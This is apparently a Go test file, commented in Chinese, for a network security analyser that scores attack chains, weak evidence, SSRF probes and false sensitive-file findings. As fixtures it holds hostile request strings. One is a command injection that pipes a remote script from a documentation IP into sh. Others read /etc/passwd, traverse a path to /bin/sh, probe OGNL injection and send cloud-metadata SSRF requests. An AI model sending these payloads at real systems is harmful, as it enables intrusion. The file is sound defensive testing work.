package store

import (
	"fmt"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"netsa/internal/model"
)

// 生产环境的资产攻击链路里，大部分是自己的内网主机与数据中心公网地址：
//   - 内网主机定时连接云厂商接口（中危的规律外连）被标为“疑似失陷”；
//   - 内部漏洞扫描器、反向代理打出的大量连接被判为洪泛，记成扫描器自身的“横向”与被访问主机的“影响”；
//   - 互联网扫描源早期被误判的洪泛把自有公网地址推进到“影响”。
//
// 这些只是需核实的迹象：照常显示并注明原因，不计入阶段、推进深度与失陷研判。
func TestAssetChainWeakEvidence(t *testing.T) {
	s := newTestStore()
	now := time.Now().Add(-time.Hour)
	fw := func(src, dst string, port int, outbound bool, h model.Hit) {
		s.Record(&model.Event{Kind: model.KindFirewall, SrcIP: src, DstIP: dst, DstPort: port, Proto: "tcp", Action: model.ActionAllow, Outbound: outbound, Time: now}, []model.Hit{h})
	}
	// 1. 内网主机每 3 分钟连接云厂商接口
	fw("10.34.45.60", "140.205.162.5", 443, true, hit("bhv-beacon", CatBeacon, model.PhasePersistence, model.SevMedium, model.ResultAllowed))
	// 2. 内部漏洞扫描器对服务器 443 的大量连接（旧版本判为洪泛）
	fw("10.34.45.31", "10.34.44.88", 443, false, hit("bhv-flood", "洪水攻击", model.PhaseImpact, model.SevHigh, model.ResultAllowed))
	// 3. 互联网扫描源：先端口扫描，旧版本又判为洪泛
	fw("79.124.58.130", "10.34.44.90", 52950, false, hit("bhv-portscan", "端口扫描", model.PhaseRecon, model.SevLow, model.ResultAllowed))
	fw("79.124.58.130", "10.34.44.90", 52951, false, hit("bhv-flood", "洪水攻击", model.PhaseImpact, model.SevHigh, model.ResultAllowed))
	// 4. 运维主机对内网的端口扫描（中危）
	fw("10.34.45.100", "10.34.44.91", 22, false, hit("bhv-portscan", "端口扫描", model.PhaseRecon, model.SevMedium, model.ResultAllowed))

	l := s.ChainList(ChainQuery{})
	if l.Compromised["high"] != 0 || l.Compromised["medium"] != 0 {
		t.Fatalf("这些迹象都不应判为失陷: %v %+v", l.Compromised, l.Chains)
	}
	if n := l.Counts["control"] + l.Counts["lateral"] + l.Counts["impact"]; n != 0 {
		t.Fatalf("需核实的迹象不应计入阶段: %v", l.Counts)
	}
	// 连接量类命中不再记为发起方的横向（新数据不记录，旧数据查询时排除）
	if tr := s.chains[chainKey{"host", "10.34.45.31"}]; tr != nil {
		t.Fatalf("内部来源的洪泛不应记成它自己的横向: %+v", tr.Steps[0])
	}
	c := s.AssetChain("10.34.45.60")
	if c == nil || c.Confidence != "" || !slices.Contains(c.Weak, "control") || !strings.Contains(c.Verdict, "需核实") {
		t.Fatalf("只有规律外连：应注明需核实、不判为失陷: %+v", c)
	}
	if len(c.Steps) != 1 || c.Steps[0].Weak == "" || len(c.Path) != 0 {
		t.Fatalf("规律外连应照常显示并注明原因，不进入关键路径: %+v", c.Steps)
	}
	if !c.Stages[stControl].Weak || c.Stages[stControl].Reached {
		t.Fatalf("控制阶段应标为需核实而不是已到达: %+v", c.Stages[stControl])
	}
	for _, a := range c.Advice {
		if strings.Contains(a, "立即隔离") {
			t.Fatalf("只有需核实的迹象不应要求立即隔离: %v", c.Advice)
		}
	}
	if !slices.ContainsFunc(c.Advice, func(a string) bool { return strings.Contains(a, "需核实") && strings.Contains(a, "规律外连") }) {
		t.Fatalf("应给出核实建议: %v", c.Advice)
	}
	for _, id := range []string{"10.34.44.88", "10.34.44.90"} {
		c := s.AssetChain(id)
		if c == nil || slices.Contains(c.Reached, "impact") || !slices.Contains(c.Weak, "impact") {
			t.Fatalf("%s：内网来源与扫描源的“洪泛”不应推进到影响: %+v", id, c)
		}
	}
	if c := s.AssetChain("10.34.45.100"); c == nil || slices.Contains(c.Reached, "lateral") || !slices.Contains(c.Weak, "lateral") {
		t.Fatalf("内网中危扫描只是需核实的横向迹象: %+v", c)
	}

	// 真实的失陷迹象照常判定：同一主机命中高危的远控外连
	fw("10.34.45.60", "203.0.113.77", 443, true, hit("c2-egress", CatC2, model.PhasePersistence, model.SevCritical, model.ResultAllowed))
	if c := s.AssetChain("10.34.45.60"); c.Confidence != "high" || !slices.Contains(c.Reached, "control") {
		t.Fatalf("命中情报的外连应判为失陷: %+v", c.ChainSummary)
	}
	// 规律外连的对端正是远控地址：是佐证，不再是需核实的迹象
	fw("10.34.45.60", "203.0.113.77", 443, true, hit("bhv-beacon", CatBeacon, model.PhasePersistence, model.SevMedium, model.ResultAllowed))
	for _, v := range s.AssetChain("10.34.45.60").Steps {
		if v.Peer == "203.0.113.77" && v.Weak != "" {
			t.Fatalf("连接远控地址的规律外连不是需核实的迹象: %+v", v)
		}
	}
	// 大范围（高危）的内网扫描仍是横向
	fw("10.34.45.100", "10.34.44.92", 23, false, hit("bhv-portscan", "端口扫描", model.PhaseRecon, model.SevHigh, model.ResultAllowed))
	if c := s.AssetChain("10.34.45.100"); !slices.Contains(c.Reached, "lateral") {
		t.Fatalf("高危的内网扫描应计入横向: %+v", c.ChainSummary)
	}
}

// 扫描器把 OAST、nip.io、云元数据地址写进 Host 头：不是站点，记在实际收到请求的服务器上；旧版本按站点记录的不再列出。
func TestAssetChainFakeHost(t *testing.T) {
	s := newTestStore()
	now := time.Now().Add(-time.Hour)
	for i, h := range []string{"aws.oast.online", "169.254.169.254.nip.io", "btjwyof9eg9c4bvk.invalid", "test.s3.amazonaws.com", "localhost", "169.254.169.254"} {
		s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "43.242.97.54", DstIP: "10.34.44.88", Host: h, Method: "GET", URI: fmt.Sprintf("/latest/meta-data/%d", i),
			Status: 404, Time: now}, []model.Hit{hit("ssrf-metadata", "SSRF", model.PhaseExploit, model.SevHigh, model.ResultFailed)})
	}
	s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "43.242.97.54", Host: "alibaba.oast.pro", Source: "nginx", Method: "GET", URI: "/", Status: 404, Time: now},
		[]model.Hit{hit("ssrf-metadata", "SSRF", model.PhaseExploit, model.SevHigh, model.ResultFailed)})
	// 旧版本记录的虚构站点
	s.mu.Lock()
	old := s.chainRolesOf(&model.Event{Kind: model.KindWeb, SrcIP: "43.242.97.54", Host: "x.example.com", URI: "/"})
	old.target.key = "dbmdin6cm7odcll7dhrg.oast.online"
	h := hit("dirscan", "目录扫描", model.PhaseRecon, model.SevLow, model.ResultFailed)
	s.chainHitLocked(&model.Event{Kind: model.KindWeb, SrcIP: "43.242.97.54"}, &h, &old, now, 0, 0)
	s.mu.Unlock()

	l := s.ChainList(ChainQuery{})
	var names []string
	for _, c := range l.Chains {
		names = append(names, c.Name)
	}
	if !slices.Contains(names, "10.34.44.88") || !slices.Contains(names, "日志源 nginx") || len(names) != 2 {
		t.Fatalf("虚构的 Host 头应记在服务器或日志源上: %v", names)
	}
	if l.Tracked != 2 {
		t.Fatalf("虚构站点不应计入资产数: %d", l.Tracked)
	}
	// 真实站点、内网主机名照常按站点记录
	s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "43.242.97.54", Host: "mg-prd-nginx", Method: "GET", URI: "/x", Status: 404, Time: now},
		[]model.Hit{hit("ssrf-metadata", "SSRF", model.PhaseExploit, model.SevHigh, model.ResultFailed)})
	if s.AssetChain("mg-prd-nginx") == nil {
		t.Fatal("内网主机名是真实站点")
	}
}

// 站点首页按是否压缩、健康检查与浏览器访问有几种固定大小（均值与方差判断不了）：扫描器探测 /.env、/backup.sql 拿到的
// 首页不是敏感文件，不登记敏感入口、不判为攻击成功；旧版本误登记的在确认兜底页面后撤销，确认的大小随快照保存。
func TestCatchAllCommonHomeSizes(t *testing.T) {
	s := newTestStore()
	now := time.Now().Add(-time.Hour)
	const site, scanner = "mg.example.com", "43.242.97.54"
	web := func(src, uri string, status int, bytes int64, hits ...model.Hit) {
		s.Record(&model.Event{Kind: model.KindWeb, SrcIP: src, Host: site, Method: "GET", URI: uri, Status: status, Bytes: bytes, Time: now, UA: "Mozilla/5.0"}, hits)
	}
	sensHit := func(rule string) model.Hit {
		return hit(rule, "敏感文件探测", model.PhaseRecon, model.SevHigh, model.ResultSuccess)
	}
	// 旧版本：扫描开头的探测在认出兜底页面之前已被记为成功，Range 请求返回的 206 被登记成敏感入口
	web(scanner, "/.env", 200, 477, sensHit("sens-env"))
	web(scanner, "/backup.sql", 206, 477, sensHit("sens-backup"))
	s.mu.RLock()
	_, envEp := s.surf.Endpoints[site+" /.env"]
	_, sqlEp := s.surf.Endpoints[site+" /backup.sql"]
	s.mu.RUnlock()
	if !envEp || !sqlEp {
		t.Fatal("认出兜底页面之前，/.env 与 206 的 /backup.sql 按存在登记（模拟旧数据）")
	}
	if c := s.AssetChain(site); c == nil || !slices.Contains(c.Reached, "breach") {
		t.Fatalf("认出之前 /.env 的 200 记为突破: %+v", c)
	}
	// 正常访问：健康检查拿到 477 字节，浏览器拿到 2 万字节左右的首页（变异系数远超 10%）
	for i := range 200 {
		b := int64(477)
		if i%3 == 0 {
			b = 20000 + int64(i)
		}
		web(fmt.Sprintf("10.0.0.%d", i%50+1), "/", 200, b)
	}
	s.mu.RLock()
	home := s.surf.Endpoints[site+" /"]
	_, envEp = s.surf.Endpoints[site+" /.env"]
	_, sqlEp = s.surf.Endpoints[site+" /backup.sql"]
	fallback := s.surf.isFallback(site, 477)
	exposed := false
	for _, f := range s.surf.Findings {
		exposed = exposed || f.Category == "敏感资源暴露" || f.Category == "攻击成功研判"
	}
	s.mu.RUnlock()
	if home.baselineMatches(477) || !home.commonSize(477) || home.commonSize(20000) {
		t.Fatalf("首页基线波动大，应按常见大小识别 477: %+v", home.Sizes)
	}
	if !fallback || envEp || sqlEp || exposed {
		t.Fatalf("确认兜底页面后应撤销误登记的敏感入口与成功研判: fallback=%v env=%v sql=%v exposed=%v", fallback, envEp, sqlEp, exposed)
	}
	if c := s.AssetChain(site); slices.Contains(c.Reached, "breach") || !slices.Contains(c.Weak, "breach") || c.Confidence != "" {
		t.Fatalf("撤销后的“攻击成功”不应再算突破: %+v", c.ChainSummary)
	}
	if n := len(s.CompromisedAssets()); n != 0 {
		t.Fatalf("疑似失陷资产应同步撤销: %d", n)
	}

	// 快照恢复后，第一条探测即可认出兜底页面
	path := filepath.Join(t.TempDir(), "state.json.gz")
	if err := s.Save(path); err != nil {
		t.Fatal(err)
	}
	r := newTestStore()
	if err := r.Load(path); err != nil {
		t.Fatal(err)
	}
	r.Record(&model.Event{Kind: model.KindWeb, SrcIP: scanner, Host: site, Method: "GET", URI: "/.git/HEAD", Status: 200, Bytes: 477, Time: now.Add(24 * time.Hour)},
		[]model.Hit{sensHit("sens-vcs")})
	r.mu.RLock()
	_, gitEp := r.surf.Endpoints[site+" /.git/head"]
	r.mu.RUnlock()
	if gitEp {
		t.Fatal("恢复后已确认的兜底页面大小应立即生效")
	}

	// 真实存在的敏感文件（大小不同）照常登记并报暴露
	r.Record(&model.Event{Kind: model.KindWeb, SrcIP: scanner, Host: site, Method: "GET", URI: "/config.bak", Status: 200, Bytes: 8123, Time: now.Add(24 * time.Hour)},
		[]model.Hit{sensHit("sens-backup")})
	r.mu.RLock()
	_, real := r.surf.Endpoints[site+" /config.bak"]
	r.mu.RUnlock()
	if !real {
		t.Fatal("真实的敏感文件应照常登记")
	}
}

// 旧版本登记的假敏感入口（没有记录响应大小）：再次被探测、响应是兜底页面时撤销。
func TestCatchAllRecheckLegacyEndpoint(t *testing.T) {
	s := newTestStore()
	now := time.Now().Add(-time.Hour)
	const site = "www.example.com"
	s.mu.Lock()
	s.surf.Endpoints[site+" /db.sql"] = &Endpoint{Host: site, Path: "/db.sql", Methods: map[string]int{}, Status: map[int]int{206: 3}, Hits: 3, Attacks: 3,
		Sensitive: "备份/数据库文件可下载", atk: map[string]struct{}{}}
	s.surf.Findings["sens:"+site+" /.env"] = &Finding{ID: "sens:" + site + " /.env", Category: "敏感资源暴露", Evidence: "43.242.97.54 访问返回 200，响应 477 字节", Count: 2}
	s.surf.Endpoints[site+" /.env"] = &Endpoint{Host: site, Path: "/.env", Methods: map[string]int{}, Status: map[int]int{200: 2}, Hits: 2, Attacks: 2,
		Sensitive: "密钥/凭证文件可公开访问", atk: map[string]struct{}{}}
	s.surf.confirmFallback(site, 477)
	_, env := s.surf.Endpoints[site+" /.env"]
	_, envF := s.surf.Findings["sens:"+site+" /.env"]
	s.mu.Unlock()
	if env || envF {
		t.Fatal("证据文本中的响应大小是兜底页面：应撤销旧的敏感资源暴露与入口")
	}
	s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "43.242.97.54", Host: site, Method: "GET", URI: "/db.sql", Status: 206, Bytes: 477, Time: now},
		[]model.Hit{hit("sens-backup", "敏感文件探测", model.PhaseRecon, model.SevHigh, model.ResultSuccess)})
	s.mu.RLock()
	_, db := s.surf.Endpoints[site+" /db.sql"]
	s.mu.RUnlock()
	if db {
		t.Fatal("旧的假敏感入口再次被探测、响应是兜底页面时应撤销")
	}
}

// 首页常见大小的统计：Space-Saving 替换进来的大小不会因为继承的计数被误判为常见。
func TestEndpointCommonSize(t *testing.T) {
	ep := &Endpoint{}
	for i := range 1000 {
		ep.noteSize(int64(10000 + i)) // 每次都不同的动态页面
	}
	for i := range 1000 {
		if ep.commonSize(int64(10000 + i)) {
			t.Fatalf("各不相同的大小不应被判为常见: %d %+v", 10000+i, ep.Sizes)
		}
	}
	became := false
	for range 30 {
		became = ep.noteSize(477) || became
	}
	if !became || !ep.commonSize(477) {
		t.Fatalf("反复出现的大小应成为常见大小: %+v", ep.Sizes)
	}
}

// 同一接口的攻击成功研判合并了多次命中：扫描器拿到兜底页面（同样大小）在前、真实利用拿到命令输出在后。
// 确认兜底页面后只撤销那部分，真实的成功仍在，链路中的突破照常计入。
func TestCatchAllKeepsRealSuccess(t *testing.T) {
	s := newTestStore()
	now := time.Now().Add(-time.Hour)
	const site = "www.example.com"
	rce := func(src, uri string, bytes int64) {
		s.Record(&model.Event{Kind: model.KindWeb, SrcIP: src, Host: site, Method: "GET", URI: uri, Status: 200, Bytes: bytes, Time: now},
			[]model.Hit{hit("cmd-inject", "命令/代码执行", model.PhaseExploit, model.SevHigh, model.ResultSuccess)})
	}
	rce("29.226.203.23", "/api/ping?host=127.0.0.1;cat%20/etc/passwd", 300) // 兜底页面
	rce("30.58.84.6", "/api/ping?host=127.0.0.1;curl%20-s%20http://203.0.113.77/s.sh%7Csh", 4821)
	// 其他路径也返回 300 字节：确认 300 是兜底页面
	rce("29.226.203.23", "/_ignition/execute-solution", 300)
	rce("29.226.203.23", "/wls-wsat/CoordinatorPortType", 300)
	rce("29.226.203.23", "/cgi-bin/.%2e/.%2e/bin/sh", 300)
	s.mu.RLock()
	f := s.surf.Findings["succ:命令/代码执行:"+site+" /api/ping"]
	s.mu.RUnlock()
	if f == nil || !slices.Equal(f.Sizes, []int64{4821}) {
		t.Fatalf("应只撤销兜底页面大小的命中，保留真实的成功: %+v", f)
	}
	c := s.AssetChain(site)
	real := false
	for _, v := range c.Steps {
		if v.Stage == "breach" && v.Src == "30.58.84.6" {
			real = v.Weak == ""
		}
	}
	if !real || !slices.Contains(c.Reached, "breach") {
		t.Fatalf("真实的命令注入成功应计入突破: %+v", c.Steps)
	}
}

// 越过侦察的攻击都来自内网地址（内部漏洞扫描器）：提示登记授权扫描；已有失陷迹象、或内网来源是横向移动时不提示。
func TestAssetChainInternalOnlyHint(t *testing.T) {
	s := newTestStore()
	now := time.Now().Add(-time.Hour)
	s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "10.34.45.31", Host: "mg.example.com", Method: "GET", URI: "/index.action?redirect:${x}", Status: 404, Time: now},
		[]model.Hit{hit("ognl", "表达式注入", model.PhaseExploit, model.SevHigh, model.ResultFailed)})
	c := s.AssetChain("mg.example.com")
	if c == nil || !c.InternalOnly || !strings.Contains(c.Verdict, "授权扫描") || !slices.ContainsFunc(c.Advice, func(a string) bool { return strings.Contains(a, "授权扫描") }) {
		t.Fatalf("只有内网来源的攻击应提示登记授权扫描: %+v", c)
	}
	// 失陷的服务器横向移动到另一台主机：不是内部扫描
	s.Record(&model.Event{Kind: model.KindFirewall, SrcIP: "10.0.0.10", DstIP: "10.0.0.31", DstPort: 445, Proto: "tcp", Action: model.ActionAllow, Time: now},
		[]model.Hit{hit("bhv-lateral-new", "横向移动", model.PhaseExploit, model.SevHigh, model.ResultAllowed)})
	if c := s.AssetChain("10.0.0.31"); c == nil || c.InternalOnly {
		t.Fatalf("横向移动不应提示登记授权扫描: %+v", c)
	}
}
